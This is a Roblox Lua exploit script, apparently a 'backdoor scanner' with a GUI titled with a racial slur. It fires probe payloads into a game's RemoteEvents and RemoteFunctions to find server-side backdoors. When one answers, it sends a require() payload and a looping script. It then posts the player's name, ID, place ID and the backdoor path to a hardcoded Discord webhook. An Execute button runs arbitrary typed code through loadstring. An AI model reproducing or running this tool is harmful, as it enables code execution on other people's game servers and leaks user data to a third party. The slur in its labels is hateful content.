--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

local G2L = {}

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- StarterGui.Nigga Backdoor (parented to PlayerGui now)
G2L["1"] = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
G2L["1"].Name = "Nigga Backdoor"
G2L["1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["1"].ResetOnSpawn = false

-- StarterGui.Nigga Backdoor.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"])
G2L["2"].BorderSizePixel = 0
G2L["2"].BackgroundColor3 = Color3.fromRGB(255, 174, 0)
G2L["2"].Size = UDim2.new(0.42188, 0, 0.30728, 0)
G2L["2"].Position = UDim2.new(0.27969, 0, -0.01887, 0)

-- StarterGui.Nigga Backdoor.SceenGui.Frame.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"])
G2L["3"].CornerRadius = UDim.new(0.1, 0)

-- StarterGui.Nigga Backdoor.ScreenGui.Frame.Nigga backdoor
G2L["4"] = Instance.new("TextLabel", G2L["2"])
G2L["4"].TextWrapped = true
G2L["4"].BorderSizePixel = 0
G2L["4"].TextScaled = true
G2L["4"].BackgroundColor3 = Color3.fromRGB(255, 174, 0)
G2L["4"].RichText = true
G2L["4"].Size = UDim2.new(1, 0, 0.19298, 0)
G2L["4"].Text = "Nigga Backdoor"
G2L["4"].Name = "Nigga backdoor"

-- StarterGui.Nigga Backdoor.ScreenGui.Frame.Nigga backdoor.UICorner
G2L["5"] = Instance.new("UICorner", G2L["4"])

-- StarterGui.Nigga Backdoor.ScreenGui.Frame.TextBox
G2L["6"] = Instance.new("TextBox", G2L["2"])
G2L["6"].CursorPosition = -1
G2L["6"].BorderSizePixel = 0
G2L["6"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["6"].PlaceholderText = "Skid code here"
G2L["6"].Size = UDim2.new(0.92963, 0, 0.49123, 0)
G2L["6"].Position = UDim2.new(0.02222, 0, 0.18421, 0)
G2L["6"].Text = ""
G2L["6"].Name = "Code"

-- StarterGui.Nigga Backdoor.ScreenGui.Frame.Execute
G2L["7"] = Instance.new("TextButton", G2L["2"])
G2L["7"].Active = true
G2L["7"].BorderSizePixel = 0
G2L["7"].BackgroundColor3 = Color3.fromRGB(79, 255, 26)
G2L["7"].Archivable = false
G2L["7"].Size = UDim2.new(0.67407, 0, 0.15789, 0)
G2L["7"].Text = "Execute"
G2L["7"].Name = "Execute"
G2L["7"].Position = UDim2.new(0.02593, 0, 0.73684, 0)

-- StarterGui.Nigga Backdoor.ScreenGui.Frame.Clear
G2L["8"] = Instance.new("TextButton", G2L["2"])
G2L["8"].BorderSizePixel = 0
G2L["8"].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
G2L["8"].Selectable = true
G2L["8"].Size = UDim2.new(0.24815, 0, 0.17544, 0)
G2L["8"].Text = "Clear"
G2L["8"].Name = "Clear"
G2L["8"].Position = UDim2.new(0.71111, 0, 0.72807, 0)

local HttpService = game:GetService("HttpService")
local remotes = {}
local backdoor = nil
local timee = os.clock()

-- Debug function
local function debug(text, lvl)
    local func = print
    if lvl == 2 then func = error
    elseif lvl == 3 then func = warn end
    func('Nigga' .. text)
end

-- Generate a random string for backdoor names
local function generateName(length)
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = ""
    for i = 1, length do
        local rand = math.random(1, #charset)
        result = result .. charset:sub(rand, rand)
    end
    return result
end

-- Function to run code on a remote
local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

-- Notification helper
local function notify(text)
    game:GetService('StarterGui'):SetCore("SendNotification", {
        Title = "Nigga",
        Duration = 6,
        Text = text
    })
end

-- Search and send backdoor payloads to remotes
for _, remote in ipairs(game:GetDescendants()) do
    if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
        
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            debug('Roblox Replicated Storage (' .. remote.Name .. ')', 1)
            continue
        end
        
        if remote.Parent == game:GetService("ReplicatedStorage") or 
           (remote.Parent.Parent == game:GetService("ReplicatedStorage")) or 
           (remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage")) then

            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                debug('Adonis filter detected (' .. remote.Name .. ')', 1)
                continue
            end
            
            if remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                debug('HD Admin (' .. remote.Name .. ')', 1)
                continue
            end
            
            if remote.Parent.Name == 'DefaultChatSystemChatEvents' then
                debug('Chat event (' .. remote.Name .. ')', 1)
                continue
            end
        end

        -- Generate a unique code name
        local code
        repeat
            code = generateName(math.random(12, 30))
        until not remotes[code]

        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
        remotes[code] = remote
        debug('Sended Backdoor "' .. remote:GetFullName() .. '"', 1)
    end
end

-- Backdoor checker loop
for i = 1, 100 do
    for code, remote in pairs(remotes) do
        if workspace:FindFirstChild(code) then
            notify('Backdoor found! ' .. (os.clock() - timee) .. 's')

            backdoor = remote
            debug(remote:GetFullName(), 3)

            -- Example payloads
            runRemote(remote, "require(171016405.1884*69)")          
            runRemote(remote, "while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")

            -- Discord webhook reporting (optional)
            local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
            if request then 
                request({
                    Url = 'https://discord.com/api/webhooks/1396108207906230377/4xrNwKq1P7TTFruKzs5BmNQcLdz0JeiYpvtufzVR8zV4Xu0dsrzBMU5l2cXQxDU-LlvY',
                    Method = 'POST',
                    Headers = {
                        ['Content-Type'] = 'application/json',
                    },
                    Body = HttpService:JSONEncode({
                        username='skid logger',
                        content = "**User: `" .. player.Name .. '` | `' .. player.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. backdoor:GetFullName() .. "`**",
                    })
                })
            end
            return G2L["1"], require
        end
    end
    wait(0.1)
end

-- Button callbacks

-- Execute button: runs code typed in TextBox
G2L["7"].MouseButton1Click:Connect(function()
    print("Execute button clicked")
    local code = G2L["6"].Text
    if code ~= "" then
        local func, err = loadstring(code)
        if func then
            local success, execErr = pcall(func)
            if not success then
                warn("Error executing code: ".. tostring(execErr))
            else
                print("Code executed successfully")
            end
        else
            warn("Failed to load code: ".. tostring(err))
        end
    else
        warn("No code entered")
    end
end)

-- Clear button: clears the TextBox
G2L["8"].MouseButton1Click:Connect(function()
    print("Clear button clicked")
    G2L["6"].Text = ""
end)

return G2L["1"], require;
